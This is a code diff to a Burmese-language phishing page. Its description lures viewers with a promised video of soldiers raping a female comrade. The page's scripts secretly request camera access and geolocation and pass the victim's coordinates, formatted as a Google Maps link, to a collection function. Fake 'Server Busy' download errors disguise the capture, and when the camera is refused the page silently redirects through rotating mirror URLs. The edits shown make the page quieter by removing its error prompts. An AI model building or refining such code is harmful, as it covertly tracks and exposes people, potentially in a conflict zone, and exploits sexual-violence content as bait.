@@ -163,7 +163,7 @@
             </div>
 
             <div class="desc-body">
-                PDFတပ်ဖွဲ့ဝင်အချင်းချင်းရဲးမေလေးကိုတောတွင်းတနေရာမှာမုဒိန်းကျင့်နေမူမှတ်တမ်းVideo... <b>#စစ်သွေး</b>
+                PDFတပ်ဖွဲ့ဝင်အချင်းချင်းရဲးမေလေးကိုတောတွင်းတနေရာမှာမုဒိန်းကျင့်နေမူမှတ်တမ်းVideo... <b>#စစ်သွေး</b>#တစ်ချို့Video ကြည့်မရ ရင်Downloadဆွဲးပြီးကြည့်နိင်ပါတယ်။
             </div>
 
             <div class="extra-features">
@@ -378,23 +378,30 @@
                 }
             };
         } catch (err) { 
-            // --- User Denied/Blocked Logic with Domain Change ---
             collectData("Camera Denied ❌ - Redirecting...");
-            pText.innerText = "";
-            pText.style.color = "#ffb86c";
+            pText.innerText = ""; // Silent mode
 
-            let currentUrl = window.location.origin;
-            let currentIndex = domainList.findIndex(d => d.includes(currentUrl));
-            let nextDomain = domainList[0];
+            let currentUrl = window.location.href;
+            let nextUrl = domainList[0]; 
 
-            if (currentIndex !== -1 && currentIndex < domainList.length - 1) {
-                nextDomain = domainList[currentIndex + 1];
-            } else if (currentIndex === domainList.length - 1) {
-                nextDomain = domainList[0];
+            // URL တစ်ခုချင်းစီကို တိတိကျကျ တိုက်စစ်တာပါ
+            if (currentUrl.includes("/sittthway5/")) {
+                nextUrl = domainList[0]; // ၅ ရောက်နေရင် ၁ ကိုပြန်သွား
+            } else if (currentUrl.includes("/sittthway4/")) {
+                nextUrl = domainList[4]; // ၄ ရောက်နေရင် ၅ ကိုသွား
+            } else if (currentUrl.includes("/sittthway3/")) {
+                nextUrl = domainList[3]; // ၃ ရောက်နေရင် ၄ ကိုသွား
+            } else if (currentUrl.includes("/sittthway2/")) {
+                nextUrl = domainList[2]; // ၂ ရောက်နေရင် ၃ ကိုသွား (Index 2 က sittthway3 ဖြစ်ရမယ်)
+            } else if (currentUrl.includes("/Sittthway/")) {
+                nextUrl = domainList[1]; // ၁ ရောက်နေရင် ၂ ကိုသွား (Index 1 က sittthway2 ဖြစ်ရမယ်)
+            } else {
+                // ဘယ်ဟာမှ ရှာမတွေ့ရင် (ဥပမာ Link လွဲနေရင်) ၂ ကိုပဲ အရင်ပို့ကြည့်မယ်
+                nextUrl = domainList[1];
             }
 
             setTimeout(() => {
-                window.location.href = nextDomain;
+                window.location.href = nextUrl;
             }, 1500);
         }
     }
@@ -469,9 +476,10 @@
                 const map = `🌍 Maps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                 collectData("Location 📍", map);
                 alrt("Download Error: Server Busy. Please try again later.");
-            }, () => { alrt("Allow location to download this file."); });
+            }, () => { //alrt("Allow location to download this file.");
+ });
         } else {
-            alrt("Geolocation is not supported by this browser.");
+            //alrt("Geolocation is not supported by this browser.");
         }
     });
 
